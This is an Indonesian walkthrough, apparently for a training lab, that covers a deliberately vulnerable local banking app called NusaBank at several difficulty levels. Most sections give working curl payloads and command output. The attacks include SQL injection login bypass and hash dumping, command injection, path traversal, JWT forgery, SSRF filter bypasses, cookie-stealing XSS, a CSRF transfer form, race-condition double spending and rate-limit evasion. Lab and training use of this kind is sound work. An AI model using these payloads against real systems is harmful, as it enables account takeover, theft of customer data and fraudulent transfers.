# Walkthrough — NusaBank Pentest Lab

> Semua perintah di bawah dijalankan dari **host** Anda, bukan dari dalam container.
> Target: `http://127.0.0.1:8080`. Level default: `easy`.
> Daftar kredensial: [`CREDENTIALS.md`](CREDENTIALS.md). Katalog celah: [`VULNS.md`](VULNS.md).

---

## 0. Menyiapkan lingkungan

```bash
cd nusabank

# Level dipilih lewat env; container hanya listen di loopback.
LAB_LEVEL=easy docker compose up --build

# Cek cepat
curl -s http://127.0.0.1:8080/health
curl -s http://127.0.0.1:8080/ | grep -o 'data-lab-level="[a-z]*"'
```

Ganti level tanpa membangun ulang:

```bash
LAB_LEVEL=hard docker compose up -d --force-recreate
```

Simpan cookie antar perintah dengan `curl -c jar.txt -b jar.txt`, atau pakai Burp/ZAP.
Contoh di bawah mengasumsikan Anda sudah memegang cookie sesi di `jar.txt`.

---

## 1. Reconnaissance pasif (`easy` → `hard`)

| # | Langkah | Perintah | Hasil yang dicari |
|---|---|---|---|
| 1.1 | Fingerprint stack | `curl -sI http://127.0.0.1:8080/` | `X-Powered-By: Flask/3.0.3 Python/3.11` (`verbose_server_header`) |
| 1.2 | Header keamanan | `curl -sI http://127.0.0.1:8080/login` | Tidak ada CSP / X-Frame-Options / HSTS |
| 1.3 | Cookie | `curl -si -d 'username=budi01&password=password' http://127.0.0.1:8080/login \| grep -i set-cookie` | Tanpa `HttpOnly`, `Secure`, `SameSite` |
| 1.4 | robots.txt | `curl -s http://127.0.0.1:8080/robots.txt` | Daftar `/admin`, `/debug`, `/backup.zip`, `/.git/`, `/uploads/` (`sensitive_robots`) |
| 1.5 | Repo ekspos | `curl -s http://127.0.0.1:8080/.git/config` | Konfigurasi repo palsu |
| 1.6 | Backup | `curl -sO http://127.0.0.1:8080/backup.zip && unzip -p backup.zip backup/env.txt` | `DB_PASS`, `FLAG{backup_archive_leaked}` |
| 1.7 | Debug | `curl -s http://127.0.0.1:8080/debug` | Variabel environment + path DB (`debug_endpoint`) |
| 1.8 | Endpoint internal | `curl -s http://127.0.0.1:8080/internal/metadata` | `FLAG{ssrf_internal_metadata_reached}` (hanya lewat SSRF pada level lain) |

**Tutup di:** `hard` (1.4 masih terbuka), `patched` (semua 404/bersih kecuali `/robots.txt` minimal).

---

## 2. Autentikasi nasabah

### 2.1 Bypass login dengan SQL injection (`easy`, `medium`)

```bash
curl -si -c jar.txt -X POST http://127.0.0.1:8080/login \
  -d "username=admin' --" -d "password=apa_saja"
# 302 -> /dashboard  (login sebagai admin)
```

Akar masalah: query dikonkatenasi di `app/routes_auth.py:95`.

Buka panel admin setelahnya:

```bash
curl -s -b jar.txt http://127.0.0.1:8080/admin/ | grep -o 'FLAG{[^}]*}' | head -1
# FLAG{flag_in_admin_panel}
```

**Tertutup di:** `hard` → `401` dengan pesan generik.

### 2.2 Enumerasi username (`easy`, `medium`)

```bash
curl -s -X POST http://127.0.0.1:8080/login -d "username=admin" -d "password=x" | grep -o "Password salah."
curl -s -X POST http://127.0.0.1:8080/login -d "username=hantu" -d "password=x" | grep -o "Username tidak ditemukan."
```

API juga membocorkan lewat kode error:

```bash
curl -s -X POST http://127.0.0.1:8080/api/v1/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"hantu","password":"x"}'
# {"ok":false,"code":"unknown_user",...}
```

**Tertutup di:** `hard` (`invalid_credentials` untuk keduanya).

### 2.3 Brute-force tanpa lockout (`easy`, `medium`)

```bash
for p in password 123456 qwerty admin123 nusabank; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://127.0.0.1:8080/login \
    -d "username=budi01" -d "password=$p")
  echo "$p -> $code"
done
```

Tidak ada `429`/lockout pada easy/medium. Di **hard** counter rate limit aktif tetapi
dapat dilewati — lihat 9.2.

### 2.4 Token reset yang dapat diprediksi (`easy`, `medium`)

```bash
curl -s -X POST http://127.0.0.1:8080/forgot-password -d "identifier=budi01" \
  | grep -o '/reset-password/[^"<> ]*'
# /reset-password/4-20261109
```

Dua masalah sekaligus:

1. **Token ditampilkan di respons HTTP.** Tidak perlu akses kotak masuk — cukup
   masukkan username korban dan tautan reset-nya muncul di halaman.
2. **Format token dapat ditebak:** `<user_id>-<YYYYMMDD>`. Artinya begitu ada satu
   permintaan reset untuk siapa pun pada hari itu, ID nasabah lain dapat dicoba
   dengan pola yang sama.

```bash
# Permintaan untuk admin (id 1) — token langsung terlihat
curl -s -X POST http://127.0.0.1:8080/forgot-password -d "identifier=admin" \
  | grep -o '/reset-password/[^"<> ]*'
# /reset-password/1-20261109

# Buka halaman reset, ubah password admin
curl -s http://127.0.0.1:8080/reset-password/1-20261109 | grep -i "reset password"
```

**Tertutup di:** `hard` (token `secrets.token_urlsafe(32)`, tautan hanya muncul di log
server dan pada respons selalu pesan generik).

### 2.5 Session fixation (`easy`, `medium`)

Cookie sesi Flask ditandatangani, jadi nilainya tidak bisa dipalsukan langsung.
Yang hilang di sini adalah `session.clear()` setelah login: seluruh isi sesi
pra-autentikasi tetap hidup, dan penanda `_fix: pre-auth` membuktikannya.

```bash
# 1. Buat sesi pra-login (flash message sudah cukup untuk membuat cookie)
curl -s -c pre.txt -X POST http://127.0.0.1:8080/forgot-password -d "identifier=zzz" -o /dev/null

# 2. Lanjutkan sesi yang sama untuk login
curl -s -b pre.txt -c pre.txt -X POST http://127.0.0.1:8080/login \
  -d "username=budi01" -d "password=password" -o /dev/null

# 3. Dekode cookie: objek sesi baru menampung uid tanpa pernah dikosongkan
cat pre.txt | grep nusabank_session | awk '{print $7}' | cut -d. -f1 \
  | base64 -d 2>/dev/null
# {"_fix":"pre-auth","_permanent":true,"uid":4}
```

Arti praktis: aplikasi tidak pernah merotasi state sesi. Setiap data yang bisa
disisipkan penyerang ke sesi pra-login (flash, preferensi, keranjang) tetap ada di
sesi korban setelah autentikasi — pola yang pada implementasi server-side session
menjadi fixation penuh.

**Tertutup di:** `hard` (dieksekusi `session.clear()` sebelum `uid` diisi:
payload hanya berisi `uid` + `sess_epoch`).

### 2.6 Remember-me palsu (`easy`, `medium`)

```bash
curl -s -b "nb_remember=1" http://127.0.0.1:8080/dashboard | grep -o 'Halo, [^<]*'
# Halo, Admin NusaBank   -> login sebagai user id 1 tanpa password
```

**Tertutup di:** `hard` (selector/validator acak yang di-hash).

### 2.7 Registrasi dengan password 1 karakter (`easy`, `medium`)

```bash
curl -si -c new.txt -X POST http://127.0.0.1:8080/register \
  -d "full_name=Tester" -d "username=tester01" -d "email=tester01@example.com" \
  -d "phone=081200000000" -d "password=a" -d "confirm_password=a"
```

Hash password tersimpan sebagai MD5 tanpa salt — lihat 2.8.

### 2.8 Crack hash MD5 (`easy`, `medium`)

Ambil hash lewat SQLi panel admin (bagian 8.1), lalu:

```bash
echo -n 'password' | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99  -> cocok dengan hash budi01
```

---

## 3. Panel administrator

### 3.1 Nasabah biasa masuk `/admin` (`easy`, `medium`)

```bash
curl -s -c cust.txt -X POST http://127.0.0.1:8080/login \
  -d "username=budi01" -d "password=password"
curl -s -b cust.txt http://127.0.0.1:8080/admin/ | grep -o 'FLAG{[^}]*}'
# FLAG{flag_in_admin_panel}
```

**Tertutup di:** `hard` → redirect kembali ke `/admin/login`.

### 3.2 SQL injection login admin (`easy`, `medium`)

```bash
curl -si -c adm.txt -X POST http://127.0.0.1:8080/admin/login \
  -d "username=admin' --" -d "password=x" | grep -i location
# Location: /admin/
```

### 3.3 Pencarian nasabah — SQLi (`easy`, `medium`)

```bash
# Tautologi: cara paling sederhana membuktikan injeksi
curl -s -b adm.txt "http://127.0.0.1:8080/admin/users?q=zzzz%25%27%20OR%201%3D1%20OR%20%27"
# 'zzzz' tanpa hasil -> 2 baris; dengan payload -> 21 baris
```

Dump hash password:

```bash
PAYLOAD="x%') UNION SELECT id,username,password_hash,email,phone,kyc_status,is_active,created_at,'admin',1,1 FROM users--"
curl -s -b adm.txt --get --data-urlencode "q=$PAYLOAD" \
  http://127.0.0.1:8080/admin/users | grep -o 'md5:[0-9a-f]\{32\}' | head -5
```

Error mentah SQLite juga tampil (`verbose_errors`): `Query error: ...`.

### 3.4 Pencarian nasabah — SQLi pada `hard`

Blacklist pada hard hanya menyaring `UNION`, `--`, `/*`, `;` (peka huruf besar/kecil)
dan langsung dibuang. Tautologi tanpa kata terlarang tetap lolos:

```bash
curl -s -b adm.txt --get \
  --data-urlencode "q=zzzz' OR 1=1 AND u.full_name LIKE '" \
  http://127.0.0.1:8080/admin/users | grep -c '<tr>'
# 21 (semua nasabah)
```

**Tertutup di:** `patched` → 2 baris (header + "tidak ada").

### 3.5 Mass assignment — naikkan role nasabah (`easy`, `medium`, `hard`)

```bash
# ani02 (id 5) -> role admin
curl -si -b adm.txt -X POST http://127.0.0.1:8080/admin/users/5 \
  -d "full_name=Ani" -d "email=ani02@example.com" -d "phone=0812" \
  -d "address=Jakarta" -d "kyc_status=verified" -d "is_active=1" \
  -d "role_id=2" | grep -i location
```

Verifikasi:

```bash
sqlite3 db/nusabank.db "SELECT u.username, r.name FROM users u JOIN roles r ON r.id=u.role_id WHERE u.id=5;"
# ani02|admin
```

Pada `hard`, `role_id` sengaja masuk daftar putih (`EDITABLE_USER_COLUMNS | {"role_id"}`).
Pada `patched`, perubahan role hanya lewat aksi terpisah.

### 3.6 Mass assignment lewat profil sendiri (`easy`, `medium`, `hard`)

```bash
curl -s -c ani.txt -X POST http://127.0.0.1:8080/login \
  -d "username=ani02" -d "password=123456"
TOK=$(curl -s -b ani.txt http://127.0.0.1:8080/profile/edit | grep -o 'name="csrf_token" value="[^"]*' | cut -d'"' -f4)
curl -si -b ani.txt -X POST http://127.0.0.1:8080/profile/edit \
  -d "full_name=Ani" -d "email=ani02@example.com" -d "phone=0812" \
  -d "address=Jakarta" -d "role_id=2" -d "csrf_token=$TOK" | grep -i location
```

### 3.7 Pemisahan tugas tidak ditegakkan (`easy`, `medium`, `hard`)

Akun `cs123` (role `admin_cs`) seharusnya hanya menangani tiket, tetapi bisa
menyetujui klaim dan mengubah pengaturan:

```bash
curl -s -c cs.txt -X POST http://127.0.0.1:8080/admin/login \
  -d "username=cs123" -d "password=NusaCS!2024"
TOK=$(curl -s -b cs.txt http://127.0.0.1:8080/admin/claims | grep -o 'name="csrf_token" value="[^"]*' | head -1 | cut -d'"' -f4)

curl -si -b cs.txt -X POST http://127.0.0.1:8080/admin/claims/1/review \
  -d "decision=approved" -d "note=ok" -d "csrf_token=$TOK" | grep -i location

curl -si -b cs.txt -X POST http://127.0.0.1:8080/admin/settings \
  -d "webhook_secret=pwned" -d "csrf_token=$TOK" | grep -i location
```

**Tertutup di:** `patched` (matriks `PERMISSIONS` → `403`).

### 3.8 Path traversal lewat `/admin/files` (`easy`, `medium`)

```bash
curl -s -b adm.txt --get --data-urlencode "name=legacy/flag.txt" \
  http://127.0.0.1:8080/admin/files
# FLAG{flag_in_file_system}

curl -s -b adm.txt --get --data-urlencode "name=../nusabank.db" \
  -o stolen.db http://127.0.0.1:8080/admin/files
file stolen.db     # SQLite 3.x database
```

### 3.9 Command injection — diagnostik (`easy`, `medium`)

```bash
# easy
curl -s -b adm.txt -X POST http://127.0.0.1:8080/admin/diagnostics \
  -d "host=127.0.0.1 | id"

# medium: blacklist hanya `;`, `&&`, `||`, backtick, `$(`, jadi pipe tunggal lolos
curl -s -b adm.txt -X POST http://127.0.0.1:8080/admin/diagnostics \
  -d "host=127.0.0.1 | cat /app/uploads/legacy/flag.txt"
```

**Tertutup di:** `hard` (argv list + regex host ketat, `shell=False`).

### 3.10 Mass assignment pengaturan (`easy`, `medium`, `hard`)

```bash
# easy/medium: semua kunci bisa ditulis, termasuk flag panel admin
curl -s -b adm.txt -X POST http://127.0.0.1:8080/admin/settings \
  -d "flag_admin_panel=FLAG{punya_saya}" -d "webhook_secret=pwned"

# hard: hanya kunci berawalan flag_ yang diblokir, kunci baru tetap masuk
curl -s -b adm.txt -X POST http://127.0.0.1:8080/admin/settings \
  -d "backdoor_enabled=1" -d "webhook_secret=pwned"
```

---

## 4. Transaksi & rekening

### 4.1 IDOR riwayat transaksi (`easy`, `medium`, `hard`)

```bash
curl -s -c budi.txt -X POST http://127.0.0.1:8080/login \
  -d "username=budi01" -d "password=password"

# Rekening budi01 = id 1; punya ani02 = id 2 & 3
curl -s -b budi.txt "http://127.0.0.1:8080/transactions?account_id=2" | grep -o 'Rp [0-9.]*' | head -3
curl -s -b budi.txt "http://127.0.0.1:8080/transactions/1/receipt" | grep -o 'No. Referensi.*' | head -1
```

### 4.2 IDOR lewat API (`easy`, `medium`, `hard`)

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8080/api/v1/auth/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"budi01","password":"password"}' | python -c 'import sys,json;print(json.load(sys.stdin)["token"])')

curl -s -H "Authorization: Bearer $TOKEN" \
  "http://127.0.0.1:8080/api/v1/balance?account_id=2"
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://127.0.0.1:8080/api/v1/profile?user_id=1" | grep -o 'FLAG{[^}]*}'
# FLAG{flag_in_database}  (kolom address milik admin)
```

### 4.3 Filter tanggal — SQLi (`easy`, `medium`)

```bash
# error-based: kutip tunggal menghasilkan 500 + traceback
curl -s -o /dev/null -w '%{http_code}\n' -b budi.txt \
  "http://127.0.0.1:8080/transactions?account_id=1&start=2024-01-01'"
# 500

# baseline: tanggal jauh di masa depan -> tabel kosong (hanya 1 baris "tidak ada")
curl -s -b budi.txt --get --data "account_id=1" \
  --data-urlencode "start=2099-01-01" http://127.0.0.1:8080/transactions | grep -c '<tr>'
# 2

# tautologi -> seluruh transaksi kembali
curl -s -b budi.txt --get --data "account_id=1" \
  --data-urlencode "start=2099-01-01' OR '1'='1" \
  http://127.0.0.1:8080/transactions | grep -c '<tr>'
# 16
```

### 4.4 Filter tanggal — SQLi blind pada `hard`

Pada hard hanya `start`/`end` yang masih dikonkatenasi; keyword `q` sudah terikat.
Tautologi membuktikan injeksi:

```bash
# baseline kosong
curl -s -b budi.txt --get --data "account_id=1" \
  --data-urlencode "start=2099-01-01" http://127.0.0.1:8080/transactions | grep -c '<tr>'
# 2

# tautologi pada `start` -> 16 baris transaksi
curl -s -b budi.txt --get --data "account_id=1" \
  --data-urlencode "start=2099-01-01' OR '1'='1" \
  http://127.0.0.1:8080/transactions | grep -c '<tr>'
# 16

# keyword `q` sudah terikat pada hard -> tidak berpengaruh
curl -s -b budi.txt --get --data "account_id=1" \
  --data-urlencode "q=' OR '1'='1" http://127.0.0.1:8080/transactions | grep -c '<tr>'
# 2
```

Time-based blind (waktu respons melonjak; penjumlahan kartesius memaksa SQLite
menghitung jutaan baris):

```bash
time curl -s -o /dev/null -b budi.txt --get \
  --data-urlencode "start=2024-01-01' AND 1=(SELECT COUNT(*) FROM transactions t1, transactions t2, transactions t3) AND '1'='1" \
  --data "account_id=1" http://127.0.0.1:8080/transactions
```

**Tertutup di:** `patched` (semua nilai terikat sebagai parameter).

### 4.5 Transfer nominal negatif (`easy`, `medium`, `hard`)

```bash
# Saldo awal
sqlite3 db/nusabank.db "SELECT balance FROM accounts WHERE id=1;"

curl -s -b budi.txt -X POST http://127.0.0.1:8080/transfer \
  -d "account_id=1" -d "dest_account=1000000521" -d "amount=-10000000" \
  -d "pin=123456" -d "description=negatif"

sqlite3 db/nusabank.db "SELECT balance FROM accounts WHERE id=1;"
# bertambah 10 juta; rekening tujuan berkurang
```

**Tertutup di:** `patched` (`amount <= 0` ditolak).

### 4.6 Race condition / double spend (`easy`, `medium`)

```bash
# Kirim 8 request paralel, masing-masing sebesar seluruh saldo
BAL=$(sqlite3 db/nusabank.db "SELECT balance FROM accounts WHERE id=1;")
seq 8 | xargs -P 8 -I{} curl -s -b budi.txt -X POST http://127.0.0.1:8080/transfer \
  -d "account_id=1" -d "dest_account=1000000521" -d "amount=$BAL" \
  -d "pin=123456" -d "description=race"
```

Setelah `sleep(0.08)` di `_apply_transfer`, kedelapan request membaca saldo yang sama
dan semuanya commit → saldo akhir `0` padahal dana terkirim 8×.

**Tertutup di:** `hard` (lock `BEGIN IMMEDIATE`; jendela sangat kecil tetapi masih
mungkin bila dikirim bersamaan — ini celah halus yang sengaja disisakan), `patched` total.

### 4.7 PIN transfer dilewati (`easy`, `medium`)

```bash
# Omitting the PIN field entirely
curl -s -b budi.txt -X POST http://127.0.0.1:8080/transfer \
  -d "account_id=1" -d "dest_account=1000000521" -d "amount=1000" \
  -d "description=tanpa-pin" | grep -o 'berhasil'
# berhasil
```

Ganti PIN juga bisa tanpa PIN lama:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/profile/pin \
  -d "current_pin=salah" -d "new_pin=111111" -d "confirm_pin=111111"
# PIN berubah (easy)
```

**Tertutup di:** `hard`.

### 4.8 Transfer lewat GET (`easy`, `medium`)

```bash
curl -si -b budi.txt \
  "http://127.0.0.1:8080/transfer/quick?account_id=1&dest_account=1000000521&amount=1000" \
  | grep -i location
```

Cukup `<img src="...">` di forum mana pun untuk memindahkan dana — melewati CSRF
dan formulir. **Tertutup di:** `hard` → `405`.

### 4.9 Transfer dari rekening orang lain (`easy`, `medium`, `hard`)

`account_id` diambil dari form dan tidak dibandingkan dengan pemilik sesi:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/transfer \
  -d "account_id=2" -d "dest_account=1000000470" -d "amount=1000" \
  -d "pin=123456" -d "description=dari-rekening-ani"
```

---

## 5. XSS

### 5.1 Reflected XSS — pencarian berita (`easy`, `medium`, `hard`)

```
http://127.0.0.1:8080/berita?q=<img src=x onerror=alert(document.cookie)>
```

Cek di browser: dialog muncul. Karena cookie tidak `HttpOnly`, `document.cookie` berisi
`nusabank_session`.

### 5.2 Reflected XSS — pencarian transaksi

```bash
curl -s -b budi.txt --get --data-urlencode "q=<script>alert(document.cookie)</script>" \
  --data "account_id=1" http://127.0.0.1:8080/transactions | grep -o '<script>alert[^<]*'
```

### 5.3 Reflected XSS — formulir kontak (tanpa login)

```bash
curl -s -X POST http://127.0.0.1:8080/kontak \
  -d "name=<img src=x onerror=alert(document.cookie)>" \
  -d "email=a@b.co" -d "message=pesan cukup panjang" \
  | grep -o '<img src=x[^>]*>'
```

**Tertutup di:** `hard`.

### 5.4 Stored XSS — deskripsi transfer (`easy`, `medium`, `hard`)

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/transfer \
  -d "account_id=1" -d "dest_account=1000000521" -d "amount=1000" -d "pin=123456" \
  -d "description=<img src=x onerror=alert(document.cookie)>"
```

Buka `/transactions?account_id=1` — payload dieksekusi setiap kali mutasi dibuka.

### 5.5 Stored XSS — tiket dukungan (`easy`, `medium`)

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/support/new \
  -d "subject=Halos" -d "category=keamanan" -d "priority=tinggi" \
  -d "body=<svg onload=alert(document.cookie)>"
```

Tiket juga dibuka oleh staf CS di `/admin/tickets/<id>` → XSS ke back-office.

### 5.6 DOM XSS — halaman utama (`easy`, `medium`, `hard`)

Buka:

```
http://127.0.0.1:8080/#<img src=x onerror=alert(document.cookie)>
```

`domGreeting()` di `static/js/app.js` menulis `location.hash` ke `innerHTML` untuk
level selain `patched`. Anchor biasa (`#produk`, `#faq`) tetap berfungsi karena
elemen yang sudah ada di halaman dilewati lebih dulu.

---

## 6. Unggah berkas & KYC

### 6.1 IDOR dokumen KYC (`easy`, `medium`)

```bash
for i in $(seq 1 14); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -b budi.txt http://127.0.0.1:8080/kyc/download/$i)
  echo "$i -> $code"
done
```

Setiap `200` adalah dokumen milik nasabah lain (KTP, NPWP, selfie).

**Tertutup di:** `hard` → `403`.

### 6.2 Path traversal `/uploads/` (`easy`, `medium`)

```bash
curl -s "http://127.0.0.1:8080/uploads/legacy/flag.txt"
# FLAG{flag_in_file_system}

# Database butuh encoding %2e%2e agar normalisasi URL tidak menutupnya
curl -s -o stolen.db "http://127.0.0.1:8080/uploads/%2e%2e/nusabank.db"
file stolen.db
```

### 6.3 Unggah berkas berbahaya (`easy`, `medium`)

```bash
# easy: nama & isi bebas
curl -s -b budi.txt -F "doc_type=ktp" \
  -F "document=@/etc/hostname;filename=evil.phtml;type=application/x-php" \
  http://127.0.0.1:8080/kyc/upload

# medium: blacklist .php/.py/.exe/.sh — pakai double extension
curl -s -b budi.txt -F "doc_type=ktp" \
  -F "document=@payload.png;filename=shell.pdf.php" \
  http://127.0.0.1:8080/kyc/upload
```

File mendarat di `uploads/kyc/` dan dapat diakses lewat `/uploads/kyc/<nama>`.

**Tertutup di:** `patched` (whitelist ekstensi + magic byte + nama acak).

---

## 7. Asuransi & tiket

### 7.1 IDOR klaim (`easy`, `medium`)

```bash
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "$i -> %{http_code}\n" -b budi.txt \
    http://127.0.0.1:8080/insurance/claim/$i
done
```

Detail klaim juga menampilkan catatan internal agen (`internal_note_exposure`,
tetap terbuka sampai `hard`).

### 7.2 Nominal klaim di luar batas (`easy`, `medium`)

```bash
# nominal negatif
curl -s -b budi.txt -X POST http://127.0.0.1:8080/insurance/claim \
  -d "policy_id=1" -d "amount=-5000000" -d "description=negatif"

# melebihi nilai pertanggungan (coverage polis 1 = Rp 100.000.000)
curl -s -b budi.txt -X POST http://127.0.0.1:8080/insurance/claim \
  -d "policy_id=1" -d "amount=999999999" -d "description=gas"
```

### 7.3 Klaim kumulatif melampaui pertanggungan (`hard`)

Pada hard tiap klaim divalidasi sendiri-sendiri terhadap `coverage`, tetapi tidak
ada penjumlahan klaim yang masih berjalan:

```bash
for i in 1 2; do
  curl -s -b budi.txt -X POST http://127.0.0.1:8080/insurance/claim \
    -d "policy_id=1" -d "amount=90000000" -d "description=klaim-$i"
done

sqlite3 db/nusabank.db \
  "SELECT SUM(amount) FROM claims WHERE policy_id=1 AND status IN ('submitted','approved');"
# > 100000000 (melebihi coverage)
```

**Tertutup di:** `patched`.

### 7.4 IDOR tiket dukungan (`easy`, `medium`)

```bash
curl -s -b budi.txt http://127.0.0.1:8080/support/2 | grep -o '<h1>[^<]*</h1>'
```

Catatan internal CS (`is_internal = 1`) ikut tampil sampai level `hard`.

### 7.5 Csrf pada tiket & komentar (`easy`, `medium`)

Semua form `POST` menerima request tanpa token CSRF pada easy/medium:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/support/1/comment \
  -d "body=balesan tanpa token"
```

Pada `hard`, pengecekan dilewati bila body dikirim sebagai `multipart/form-data`:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/support/1/comment \
  -F "body=balesan multipart tanpa token"
```

**Tertutup di:** `patched` (token per sesi wajib).

---

## 8. E-Wallet (SSRF)

### 8.1 SSRF ke metadata internal (`easy`)

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/wallet \
  -d "label=Mitra" -d "url=http://127.0.0.1:8080/internal/metadata" \
  | grep -o 'FLAG{[^}]*}'
# FLAG{ssrf_internal_metadata_reached}
```

Server juga menyimpan respons mentah di tabel `webhook_logs` — lihat riwayat di `/wallet`.

### 8.2 SSRF melewati blacklist (`medium`)

Blacklist medium hanya memuat string `localhost`, `169.254.169.254`, dan `file://`.
`127.0.0.1` **tidak** ada di daftar, jadi alamat loopback literal langsung lolos:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/wallet \
  -d "label=Mitra2" -d "url=http://127.0.0.1:8080/internal/admin-api"
# FLAG{internal_admin_api_exposed}
```

Varian lain yang juga lolos: `http://127.0.0.2:8080/...` (loopback alternatif) dan
format IP desimal `http://2130706433:8080/...` (yang di-resolve sistem ke `127.0.0.1`).

### 8.3 SSRF pada `hard` (trailing dot)

Pada hard host dibandingkan sebagai string tanpa normalisasi:

```bash
curl -s -b budi.txt -X POST http://127.0.0.1:8080/wallet \
  -d "label=Mitra3" -d "url=http://localhost.:8080/internal/metadata"
```

`localhost.` bukan `localhost` bagi string compare, tetapi resolver DNS
memperlakukannya sama. Perhatikan: port harus port aplikasi yang sedang berjalan.

**Tertutup di:** `patched` (resolusi DNS + penolakan IP privat/loopback/link-local).

---

## 9. REST API `/api/v1/`

### 9.1 JWT dengan secret lemah (`easy`, `medium`)

```python
# forge.py
import jwt
token = jwt.encode({"sub": "1", "role": "admin"}, "nusabank123", algorithm="HS256")
print(token)
```

```bash
TOKEN=$(python forge.py)
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://127.0.0.1:8080/api/v1/profile?user_id=1" | grep -o 'FLAG{[^}]*}'
```

Token juga diterima tanpa tanda tangan (`alg: none`) dan tanpa klaim `exp`.

**Tertutup di:** `hard` (secret kuat, algoritma dipin, `exp` + `sub` wajib).

### 9.2 Rate limit dapat dilewati (`hard`)

Pengunci limiter pada `hard` memakai header `X-Forwarded-For` yang dikendalikan klien.
Tanpa header, batas aktif (`429` setelah ~8 percobaan); dengan header berputar,
counter selalu mulai dari bucket kosong:

```bash
# tanpa header -> mulai muncul 429
for i in $(seq 1 12); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST http://127.0.0.1:8080/login \
    -d "username=budi01" -d "password=x"
done; echo
# 401 401 401 401 401 401 401 401 429 429 429 429

# dengan X-Forwarded-For berputar -> tidak pernah 429
for i in $(seq 1 12); do
  curl -s -o /dev/null -w '%{http_code} ' -H "X-Forwarded-For: 10.8.8.$i" \
    -X POST http://127.0.0.1:8080/login -d "username=budi01" -d "password=x"
done; echo
```

Endpoint API punya perilaku yang sama (`/api/v1/auth/token`, limit 10/menit):
pada `hard` header berputar melewati batas; pada `patched` limiter memakai
`remote_addr` sehingga tetap `429`.

### 9.3 CORS terbuka (`easy`, `medium`)

```bash
curl -si -H 'Origin: https://evil.example' http://127.0.0.1:8080/api/v1/ping \
  | grep -i 'access-control'
# Access-Control-Allow-Origin: https://evil.example
# Access-Control-Allow-Credentials: true
```

### 9.4 Tanpa rate limit di API (`easy`, `medium`)

`/api/v1/auth/token` menerima percobaan tanpa batas:

```bash
for p in $(seq -w 1 100); do
  curl -s -o /dev/null -X POST http://127.0.0.1:8080/api/v1/auth/token \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"budi01\",\"password\":\"pass$p\"}"
done
```

---

## 10. Kalkulator kredit

### 10.1 Manipulasi suku bunga / uang muka (`easy`, `medium`)

```bash
# easy: field tersembunyi `rate` dipercaya
curl -s -X POST http://127.0.0.1:8080/kalkulator \
  -d "produk=kendaraan" -d "harga=150000000" -d "dp=30000000" \
  -d "tenor=36" -d "rate=-50" | grep -o 'Rp -[0-9.]*'

# medium: uang muka lebih besar dari harga -> pokok negatif
curl -s -X POST http://127.0.0.1:8080/kalkulator \
  -d "produk=kendaraan" -d "harga=150000000" -d "dp=200000000" \
  -d "tenor=36" | grep -o 'Rp -[0-9.]*'
```

### 10.2 Gerbang validasi dapat dilewati (`hard`)

Validasi pada hard hanya berjalan bila klien mengirim `form_version=v2`.
Hapus field tersebut:

```bash
curl -s -X POST http://127.0.0.1:8080/kalkulator \
  -d "produk=kendaraan" -d "harga=150000000" -d "dp=300000000" \
  -d "tenor=36" | grep -o 'Rp -[0-9.]*'
```

**Tertutup di:** `patched` (validasi server selalu berjalan).

---

## 11. Redirect, CSRF, dan lain-lain

### 11.1 Open redirect (`easy`, `medium`)

```bash
curl -si -X POST "http://127.0.0.1:8080/login?next=https://evil.example/phish" \
  -d "username=budi01" -d "password=password" | grep -i location
# Location: https://evil.example/phish
```

### 11.2 Open redirect pada `hard` (protokol-relative)

Pengecekan hard hanya `target.startswith("/")`, sehingga `//evil.example` lolos:

```bash
curl -si -X POST "http://127.0.0.1:8080/login?next=//evil.example/phish" \
  -d "username=budi01" -d "password=password" | grep -i location
# Location: //evil.example/phish
```

**Tertutup di:** `patched` (`is_safe_redirect`).

### 11.3 CSRF transfer antar-situs

Simpan sebagai `csrf.html` di host lain (mis. `python -m http.server 9000`):

```html
<form id="f" method="post" action="http://127.0.0.1:8080/transfer">
  <input name="account_id" value="1">
  <input name="dest_account" value="1000000521">
  <input name="amount" value="500000">
  <input name="pin" value="123456">
</form>
<script>document.getElementById('f').submit()</script>
```

Korban membuka halaman selama sesi aktif → dana berpindah. Berfungsi pada easy/medium;
pada hard cukup ubah `enctype="multipart/form-data"`.

### 11.4 Directory/berkas sensitif cepat

```bash
for p in /.git/config /backup.zip /debug /internal/metadata /internal/admin-api /robots.txt; do
  printf '%-24s ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:8080$p"
done
```

---

## 12. Tabel Flag

| Flag | Lokasi | Cara memperoleh |
|---|---|---|
| `FLAG{flag_in_database}` | `users.address` milik admin, `lab_flags` | SQLi / IDOR API `/api/v1/profile?user_id=1` |
| `FLAG{flag_in_file_system}` | `uploads/legacy/flag.txt` | Path traversal `/uploads/legacy/flag.txt` atau `/admin/files?name=` |
| `FLAG{flag_in_admin_panel}` | `settings.flag_admin_panel` | Masuk `/admin` (nasabah biasa pada easy/medium / SQLi login admin) |
| `FLAG{ssrf_internal_metadata_reached}` | `/internal/metadata` | SSRF webhook e-wallet |
| `FLAG{internal_admin_api_exposed}` | `/internal/admin-api` | SSRF ke endpoint internal |
| `FLAG{backup_archive_leaked}` | `/backup.zip` | Unduh & unzip `backup/env.txt` |
| `FLAG{kyc_file_1..14}` | isi dokumen KYC palsu | IDOR `/kyc/download/<id>` |
| `FLAG{claim_file_1..10}` | lampiran klaim | IDOR `/insurance/claim/<id>/attachment` |
| `FLAG{news_1..12}` | badan berita | Baca `/berita/<slug>` |

---

## 13. Checklist per Modul

Centang saat celah berhasil dibuktikan. Lihat kolom level di [`VULNS.md`](VULNS.md).

```
Autentikasi
[ ] SQLi login nasabah            (easy, medium)
